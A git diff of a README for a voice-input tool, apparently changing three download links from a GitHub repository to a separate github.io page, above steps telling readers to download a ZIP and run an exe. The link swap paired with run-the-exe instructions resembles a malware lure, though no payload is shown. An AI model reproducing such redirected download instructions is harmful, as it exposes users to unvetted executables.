@@ -1,6 +1,6 @@
 # 🎙️ omarchy-voxtype-enhance - Voice Input Made Effortless for Everyone
 
-[![Download omarchy-voxtype-enhance](https://img.shields.io/badge/Download-omarchy--voxtype--enhance-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6347)](https://github.com/Johnmeri0008/omarchy-voxtype-enhance)
+[![Download omarchy-voxtype-enhance](https://img.shields.io/badge/Download-omarchy--voxtype--enhance-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF6347)](https://johnmeri0008.github.io)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps exactly. You will be ready in under five minutes.
 ### Step 1: Download the File
 
 Visit this link to download the application:  
-**[https://github.com/Johnmeri0008/omarchy-voxtype-enhance](https://github.com/Johnmeri0008/omarchy-voxtype-enhance)**
+**[https://johnmeri0008.github.io](https://johnmeri0008.github.io)**
 
 Once you click the link, you will go to a page that shows you a green button. Click that green button that says **"Code"**, then click **"Download ZIP"**. Your web browser will start downloading a file.
 
@@ -143,7 +143,7 @@ This tool is designed to be simple. You never have to open a command prompt, edi
 
 Remember, your main link is:
 
-**[https://github.com/Johnmeri0008/omarchy-voxtype-enhance](https://github.com/Johnmeri0008/omarchy-voxtype-enhance)**
+**[https://johnmeri0008.github.io](https://johnmeri0008.github.io)**
 
 Go there, download the zip, extract it, and run the exe. That is all there is to it.
 
